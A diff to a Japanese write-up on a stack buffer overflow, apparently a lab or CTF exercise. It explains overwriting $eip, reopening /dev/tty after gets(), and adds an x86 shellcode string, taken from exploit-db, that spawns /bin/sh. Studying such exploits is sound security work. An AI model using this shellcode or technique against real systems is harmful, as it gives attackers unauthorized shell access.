@@ -180,4 +180,11 @@ $eip   : 0x1cedbeef
 `$eip`を自由に書き換えられるということは、次に飛ばすアドレスを好きにできることである
 この`$eip`を書き換えたスタックのアドレスの直後にshellcodeを仕込んで見る
 
-ただし、`gets`を用いた際に新たにshellを開こうとすると、
+ただし、`gets`を用いた際に新たにshellを開こうとすると、すぐにターミナルが閉じてしまいコマンドを入力できない
+そこで、`/dev/tty`を再度開いたのちに、`/bin/sh`を起動させる
+shellcodeは[exploit DB](https://www.exploit-db.com/exploits/13357/)のものを使用した
+
+```python
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+```
+
